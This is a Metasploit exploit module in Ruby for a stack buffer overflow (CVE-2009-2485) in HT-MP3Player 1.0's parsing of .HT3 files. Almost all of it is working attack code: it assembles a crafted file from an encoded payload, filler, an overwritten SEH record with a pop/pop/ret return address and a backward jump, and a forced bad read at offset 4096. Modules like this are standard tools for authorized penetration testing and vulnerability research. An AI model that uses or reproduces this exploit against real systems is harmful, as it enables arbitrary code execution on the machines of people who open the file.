##
# $Id: ht_mp3player_ht3_bof.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HT-MP3Player 1.0 HT3 File Parsing Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HT-MP3Player 1.0.
					Arbitrary code execution could occur when parsing a specially crafted
					.HT3 file.

					NOTE: The player installation does not register the file type to be
					handled. Therefore, a user must take extra steps to load this file.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'hack4love <hack4love[at]hotmail.com>',
					'His0k4',
					'jduck',
				],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2009-2485' ],
					[ 'OSVDB', '55449' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/9034' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/9038' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 4108,
					'DisableNops'   	=>  'True',
					# input restriction: UTF-8!
					'BadChars' 			=> [0,0x0a,0x0d,*(0x80..0xcf)].pack("C*"),
					'EncoderType' 		=> Msf::Encoder::Type::AlphanumMixed,
					'StackAdjustment' => -8500,
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'HT-MP3Player 1.0',
						{
							'Ret' => 0x00406cff, # pop/pop/ret @ HTMP3Player.exe
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jun 29 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.ht3']),
			], self.class)
	end

	def exploit

		# payload first
		bof = payload.encoded

		# filler
		bof << rand_text_alphanumeric(payload_space - bof.length)

		# NOTE: the nul smashes a nul, oh no!
		sehrec = generate_seh_record(target.ret)
		# jmp -4108 (depends on target addr ending with 0xff)
		sehrec[0,4] = "\xe9\xef\xef\xff"
		bof << sehrec

		# crash reading from offset 4096 (put bad addr here)
		bof[4096,4] = [0xf0f0f0f0].pack('V')

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(bof)

	end

end